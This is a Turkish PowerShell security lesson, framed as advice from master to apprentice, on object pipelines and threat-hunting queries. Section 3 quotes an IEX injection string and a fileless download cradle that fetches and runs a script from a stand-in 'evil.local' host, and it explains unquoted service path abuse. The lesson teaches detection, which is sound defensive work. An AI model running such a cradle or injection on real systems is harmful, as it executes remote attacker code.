# ÖZEL LİSANS — TÜM HAKLAR SAKLIDIR
# Telif Hakkı (c) 2026 Seydi Eryılmaz (@seydivakkas)
# Bu yazılım ve ilgili tüm dosyalar ("Yazılım") yalnızca görüntüleme ve eğitim amaçlı olarak paylaşılmıştır.
# YASAKLAR: Kopyalanamaz, çoğaltılamaz, dağıtılamaz, değiştirilemez, satılamaz, tersine mühendislik yapılamaz.
# İZİN VERİLEN KULLANIM: GitHub üzerinde görüntüleme ve inceleme (kopyalamadan).
# YAZARIN AÇIK YAZILI İZNİ OLMAKSIZIN HİÇBİR KULLANIM HAKKI TANINMAZ.

# Gün 085: PowerShell Nesne Boru Hattı (Object Pipeline) ve Güvenlik Otomasyonu

## Usta-Çırak Açılış Hasbihali

Evladım, çırağım;
Bugün 13. haftaya adım atıyoruz. Artık temel betikleme mantığını aşıp kurumsal Windows ve bulut ortamlarının can damarı olan **PowerShell** ekosistemine giriyoruz.

Unix dünyasında büyüyen bir güvenlikçi için boru hattı (`|`) dendiğinde akla ilk gelen şey iki komut arasında akan bir **bayt veya metin akışıdır (byte/text stream)**. `grep` ile satır ararsın, `awk` ile sütun kesersin, `sed` ile değiştirirsin. Ancak çıktıdaki tek bir fazladan boşluk, dil ayarı veya sekme (tab) tüm adli betiğini darmadağın eder.

İşte PowerShell'in mimarı Jeffrey Snover'ın 2000'lerin başında dünyaya sunduğu devrim tam burada başlar: **PowerShell nesne boru hattında metin değil, tip güvenli .NET / CLR nesneleri (Objects) akar.** `Get-Process` çalıştırdığında sana ekranda görünen harfler değil, `System.Diagnostics.Process` sınıfından türemiş canlı bir nesne gelir. Bu nesnenin `CPU`, `Id`, `Path`, `Threads` gibi onlarca özelliği ve `Kill()`, `WaitForExit()` gibi metotları vardır.

Bir güvenlik operasyoncusu (SOC Analisti) ve tehdit avcısı (Threat Hunter) için bu muazzam bir güçtür; çünkü regex cambazlığı yapmadan yüz binlerce sistem nesnesini saniyeler içinde süzebilir. Ancak dikkat: Bu boru hattının içine saldırganlar `Invoke-Expression` (IEX), Base64 gizleme (obfuscation) ve Download Cradle enjekte ettiğinde aynı boru hattı ölümcül bir silah haline gelir!

Bugünkü dersimizde nesne boru hattının iç mekaniğini, adli tehdit avcılığı boru hatlarını ve bu boru hatlarının nasıl denetleneceğini adım adım öğreneceksin.

---

## 1. PowerShell Nesne Boru Hattının Temel Çalışma Prensibi

### 1.1. Metin vs. Nesne Boru Hattı Karşılaştırması

| Özellik | Unix Shell (Bash/sh) | PowerShell Nesne Boru Hattı |
| :--- | :--- | :--- |
| **Akan Veri Türü** | Düz metin / Karakter akışı (String/Byte) | Yapılandırılmış .NET / PSObject Nesneleri |
| **Özellik Erişimi** | `awk '{print $2}'`, `cut -d' ' -f1` | `$_.ProcessName`, `$_.WorkingSet64` |
| **Kırılganlık** | Çıktı formatı değişirse betik çöker | Nesne şeması korunduğu sürece asla bozulmaz |
| **İşleme Modeli** | Akış (Streaming) | Akış (`Process` bloğu) veya Toplama |

### 1.2. Temel Filtreleme ve Dönüştürme Cmdlet'leri
1. **`Where-Object` (`?`):** Gelen nesne akışını bir koşula (ScriptBlock) göre filtreler.
   ```powershell
   Get-Process | Where-Object { $_.CPU -gt 10 -and $_.WorkingSet64 -gt 100MB }
   ```
2. **`Select-Object` (`select`):** Nesneden yalnızca ilgilendiğimiz özellikleri seçer veya hesaplanmış özellik (calculated property) ekler.
   ```powershell
   Get-Process | Select-Object -Property Id, ProcessName, @{Name='MB'; Expression={[math]::Round($_.WorkingSet64/1MB,2)}}
   ```
3. **`ForEach-Object` (`%`):** Her nesne için bir işlem bloğu yürütür.
4. **`Sort-Object` & `Group-Object` & `Measure-Object`:** İstatistiki özet ve sıralama sağlar.

### 1.3. `Begin`, `Process`, `End` Yaşam Döngüsü (Streaming vs. Hoarding)
PowerShell fonksiyonlarında boru hattından nesne kabul etmek (`ValueFromPipeline = $true`) performans ve bellek için kritiktir:
- **`begin { }`:** Boru hattından ilk nesne gelmeden önce 1 kez çalışır.
- **`process { }`:** Boru hattından gelen **HER BİR NESNE İÇİN** ayrı ayrı çalışır. Bellek şişmez; nesne gelir, işlenir ve sonraki cmdlet'e iletilir.
- **`end { }`:** Boru hattındaki tüm nesneler bittiğinde 1 kez çalışır.

---

## 2. Nesne Boru Hattı ile Tehdit Avcılığı (Threat Hunting)

Siber savunmada PowerShell boru hatları adli bilişim analistinin büyüteçleridir:

1. **Şüpheli Ebeveyn-Çocuk Süreç İlişkileri (MITRE T1059 / LOLBins):**
   Normal şartlarda bir Word (`winword.exe`) veya Excel (`excel.exe`) dokümanı arka planda bir `powershell.exe` veya `cmd.exe` başlatamaz. Başlatıyorsa makro tabanlı bir oltalama (phishing) saldırısıdır.
   ```powershell
   Get-CimInstance Win32_Process | 
       Where-Object { 
           $parent = (Get-Process -Id $_.ParentProcessId -ErrorAction SilentlyContinue).ProcessName
           $parent -match '(?i)winword|excel|powerpnt' -and $_.Name -match '(?i)powershell|cmd'
       }
   ```

2. **Ağ Soketi ve Süreç Korelasyonu:**
   `Get-NetTCPConnection` ile dinlemede olan portları çekip, bunları `Get-Process` nesneleriyle bağlayarak 4444 (Metasploit) veya 1337 portunu dinleyen zararlıyı anında tespit edebiliriz:
   ```powershell
   Get-NetTCPConnection -State Listen | 
       Where-Object { $_.LocalPort -in 4444, 1337, 8888 } | 
       Select-Object LocalAddress, LocalPort, OwningProcess, @{Name='Name'; Expression={(Get-Process -Id $_.OwningProcess).ProcessName}}
   ```

---

## 3. Boru Hattındaki Ölümcül Güvenlik Zafiyetleri

1. **`Invoke-Expression` (IEX) Enjeksiyonu (CWE-95):**
   Geliştiricilerin en büyük günahı boru hattından gelen kullanıcı metnini doğrudan `IEX`'e göndermektir:
   `$userInput | Invoke-Expression`
   Saldırgan buraya `; Start-Process calc.exe` veya zararlı scriptblock ekleyerek tam yetkili kod çalıştırır.

2. **Download Cradle (CWE-829):**
   `IWR` veya `WebClient` ile uzaktan çekilen kodun doğrudan boru hattında çalıştırılması:
   `(New-Object Net.WebClient).DownloadString('http://evil.local/s.ps1') | iex`
   Tüm savunma duvarlarını baypas etmeye çalışan klasik dosyasız (fileless) saldırı yöntemidir.

3. **Tırnaksız Servis Yolları (Unquoted Service Path - CWE-428):**
   `C:\Program Files\Insecure App\service.exe` yolu tırnak içine alınmadığında, Windows boşlukları ayırarak `C:\Program.exe` veya `C:\Program Files\Insecure.exe` dosyasını arar. Saldırgan buraya zararlı bir `Program.exe` bırakırsa sistem açılışında SYSTEM yetkisiyle kod çalıştırır.

---

## 4. Ustanın Çırağa Tavsiyesi

"Evladım; PowerShell nesne boru hattı bir su borusu gibidir. İçinden berrak kaynak suyu da akıtabilirsin, zehir de. Bir savunmacı olarak boru hattının her dirseğine filtre koyacaksın. `Invoke-Expression` gördüğün yere kırmızı alarm çekecek, belleğe sınırsız nesne yığan boru hatlarına kota koyacaksın!"
